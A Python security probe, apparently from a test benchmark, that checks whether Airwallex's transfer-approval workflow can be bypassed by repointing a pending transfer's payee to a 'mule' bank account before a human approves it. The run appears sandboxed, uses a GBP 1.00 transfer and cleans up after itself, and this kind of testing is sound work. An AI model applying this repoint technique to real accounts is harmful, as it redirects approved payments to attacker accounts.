"""Does Airwallex's OWN native transfer-approval workflow bind the destination at SUBMIT, or re-read the
payee at RELEASE? If it re-reads (like a batch), a transfer waiting IN_APPROVAL can be repointed in place and
the human approves money to the EDITED account - the sanctioned human control is blind to an agent-driven redirect.

Phased, because the toggle + Approve/Recall are web-app clicks only the user can do. State shared via a sidecar
json. Kestrel only, GBP 1.00, payee repointed to a mule, everything cancelled/deleted in `cleanup`.

PREREQS (user, web app, Settings > transfer approval workflow): set "Require API-initiated transfers to follow
this workflow" = Required; add yourself as an approver (Any 1); any amount; allow self-approve. REVERT after.

  export MSYS_NO_PATHCONV=1 PYTHONIOENCODING=utf-8
  uv run python bench/probes/approval_repoint.py setup      # I create payee+transfer; expect it to wait for approval
  uv run python bench/probes/approval_repoint.py repoint     # I edit the payee -> mule, while it waits
  # >>> you Approve the transfer in the web app (and screenshot the approval screen: does it show bank details?)
  uv run python bench/probes/approval_repoint.py read        # I read where it actually went: mule = reproduced, orig = held
  uv run python bench/probes/approval_repoint.py cleanup
"""
from __future__ import annotations

import json
import sys
import time
from decimal import Decimal
from pathlib import Path

HERE = Path(__file__).resolve()
ROOT = HERE.parents[2]
sys.path[:0] = [str(ROOT), str(ROOT / "scripts")]
import os  # noqa: E402

import awx as _env  # noqa: E402

for n in ("AWX_CLIENT_ID", "AWX_API_KEY", "AWX_BASE_URL", "AWX_EMPLOYER_A", "AWX_EMPLOYER_B", "AWX_EMPLOYER_C", "AWX_PLATFORM_ACCOUNT"):
    try:
        os.environ.setdefault(n, _env.env(n) or "")
    except (KeyError, FileNotFoundError):
        pass
from ringfence.awx import Awx, AwxError  # noqa: E402

STATE = HERE.with_suffix(".state.json")
ORIG_ACCT, ORIG_SORT = "11112222", "040004"          # the legit contractor account
MULE_ACCT, MULE_SORT = "99999901", "200000"          # where the attacker repoints it
ks = Awx().for_tenant("kestrel")


def say(*a):
    print(*a, flush=True)


def call(f, *a):
    try:
        return f(*a)
    except AwxError as e:
        return {"_error": e.status, "code": e.code, "msg": str(e)[:200], "details": e.details}


def load() -> dict:
    return json.loads(STATE.read_text()) if STATE.exists() else {}


def save(d: dict):
    STATE.write_text(json.dumps(d, indent=2))


def dest(t) -> str:
    bd = ((t or {}).get("beneficiary") or {}).get("bank_details") or {}
    return f"..{str(bd.get('account_number', '?'))[-4:]} sort {bd.get('account_routing_value1')}"


def payee_body(acct, sort, bank):
    return {"nickname": f"{load().get('tag', 'PRB-appr')}", "transfer_methods": ["LOCAL"], "beneficiary": {
        "entity_type": "PERSONAL", "first_name": "Jane", "last_name": "Probe",
        "address": {"country_code": "GB", "city": "London", "street_address": "1 Test St", "postcode": "EC1A 1BB"},
        "bank_details": {"bank_country_code": "GB", "account_currency": "GBP", "account_name": "Jane Probe",
                         "bank_name": bank, "account_routing_type1": "sort_code",
                         "account_routing_value1": sort, "account_number": acct}}}


def setup():
    tag = f"PRB-appr-{int(time.time()) % 100000}"
    st = {"tag": tag}
    save(st)
    r = call(ks.post, "/beneficiaries/create", payee_body(ORIG_ACCT, ORIG_SORT, "HSBC"))
    if "_error" in r:
        return say("payee create failed:", r)
    st["bid"] = r["id"]
    st["rid"] = f"{tag}-t"
    save(st)
    say("payee", st["bid"], "-> legit", dest({"beneficiary": {"bank_details": {"account_number": ORIG_ACCT, "account_routing_value1": ORIG_SORT}}}))
    t = call(ks.post_money, "/transfers/create", {
        "request_id": st["rid"], "beneficiary_id": st["bid"], "transfer_amount": Decimal("1.00"),
        "transfer_currency": "GBP", "source_currency": "GBP", "transfer_method": "LOCAL",
        "reason": "professional_business_services", "reference": tag})
    if "_error" in t:
        return say("transfer create failed:", t)
    st["tid"] = t["id"]
    save(st)
    status = t.get("status")
    say("transfer", st["tid"], "status:", status, "dest:", dest(t))
    if status in ("SCHEDULED", "PAID", "SENT"):
        say("!! status is", status, "- the approval workflow is NOT gating API transfers. Set it to Required and re-run setup.")
    else:
        say("OK: transfer is waiting (", status, "). Next: run `repoint`, then Approve it in the web app.")


def repoint():
    st = load()
    bid, tid = st.get("bid"), st.get("tid")
    if not bid or not tid:
        return say("no state; run setup first")
    r = call(ks.post, f"/beneficiaries/{bid}/update", payee_body(MULE_ACCT, MULE_SORT, "Barclays"))
    say("repoint:", "ok" if "_error" not in r else r)
    live = call(ks.get, f"/beneficiaries/{bid}")
    say("live payee now:", dest({"beneficiary": (live or {}).get("beneficiary")}))
    t = call(ks.get, f"/transfers/{tid}")
    say("transfer now:", t.get("status"), "embedded dest:", dest(t))
    say(">>> NOW: Approve the transfer in the web app, and screenshot the approval screen (does it show bank details?). Then run `read`.")


def read():
    st = load()
    tid = st.get("tid")
    if not tid:
        return say("no state; run setup first")
    t = call(ks.get, f"/transfers/{tid}")
    status, d = t.get("status"), dest(t)
    say("transfer", tid, "status:", status, "FINAL dest:", d)
    last4 = d.split()[0].lstrip(".")
    assert last4 in (ORIG_ACCT[-4:], MULE_ACCT[-4:], "?"), f"unexpected destination {d!r}"  # self-check: read a real dest
    if last4 == MULE_ACCT[-4:]:
        say("VERDICT: REPRODUCED - native approval released to the EDITED (mule) account. Airwallex's own human control is blind to the repoint. Sev-1.")
    elif last4 == ORIG_ACCT[-4:]:
        say("VERDICT: HELD - native approval snapshotted the destination at submit; the repoint did NOT follow. Airwallex got this right.")
    else:
        say("VERDICT: inconclusive - destination not resolvable yet; status", status)


def cleanup():
    st = load()
    tid, bid = st.get("tid"), st.get("bid")
    if tid:
        status = "?"
        for i in range(5):
            call(ks.post, f"/transfers/{tid}/cancel", {})
            status = call(ks.get, f"/transfers/{tid}")
            status = status.get("status") if isinstance(status, dict) else "?"
            if status in ("CANCELLED", "FAILED"):
                break
            time.sleep(3 * (i + 1))
        else:
            call(ks.post, f"/simulation/transfers/{tid}/transition", {"status": "FAILED"})
        say("transfer", tid, status)
    if bid:
        say("payee delete:", call(ks.post, f"/beneficiaries/{bid}/delete", {}))
    # sweep any stragglers from this probe
    for b in (call(ks.get, "/beneficiaries", {"page_num": 0, "page_size": 100}) or {}).get("items", []):
        if str(b.get("nickname", "")).startswith("PRB-appr"):
            call(ks.post, f"/beneficiaries/{b['id']}/delete", {})
            say("swept", b["id"])
    if STATE.exists():
        STATE.unlink()


if __name__ == "__main__":
    phase = sys.argv[1] if len(sys.argv) > 1 else ""
    {"setup": setup, "repoint": repoint, "read": read, "cleanup": cleanup}.get(phase, lambda: say(__doc__))()
